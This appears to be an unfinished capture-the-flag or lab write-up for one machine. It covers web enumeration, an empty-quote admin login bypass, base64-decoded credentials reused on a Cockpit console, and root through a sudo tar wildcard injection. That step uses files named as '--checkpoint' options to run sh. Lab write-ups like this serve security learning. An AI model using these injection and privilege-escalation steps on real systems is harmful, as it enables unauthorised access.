
#InProgress 
```IP
192.168.232.10
```
# Enumeration
Ubuntu 20.04.6 LTS

## HTTP 80
apache 2.4.41
```
login.php
logout.php
blocked.html
db_config.php
```

## HTTP 9090
server blaze
# Exploitation
in /login.php we can get in as admin:''
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241125090028.png?raw=true)
we can convert them with
```
echo 'dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy'  | base64 -d
```
we seem to have a set of credentials
```
james:canttouchhhthiss@455152
```
```
cameron:thisscanttbetouchedd@455152
```
we aren't able to SSH with either of them but we can use them on the blaze server in 9090

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241124180708.png?raw=true)
we can enter with james:canttouchhhthiss@455152
we get cockpit version 215
we have a terminal and we can get initial foothold
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241125091617.png?raw=true)

# PrivEsc

## Manual
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241125091922.png?raw=true)
```
sudo -l
```
it seems like we have access to this command
```
(ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
```
we search how to scape it in GTFObins
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241125094214.png?raw=true)
we need 2 files with names as the highlighted parameters in order to tar to execute them
we create 2 files as follows in /tmp:
```
echo '' > /tmp/'--checkpoint=1'
```
eventhough we can't create files with a '/' character, we have sh in path so we could create the other file as follows:
```
touch ./'--checkpoint-action=exec=sh'
```


![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241125094048.png?raw=true)

when executing the command we gain root access
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241125094004.png?raw=true)
we now have proof.txt

## Automated

### Peass
### Mimikatz

# Lateral Movement
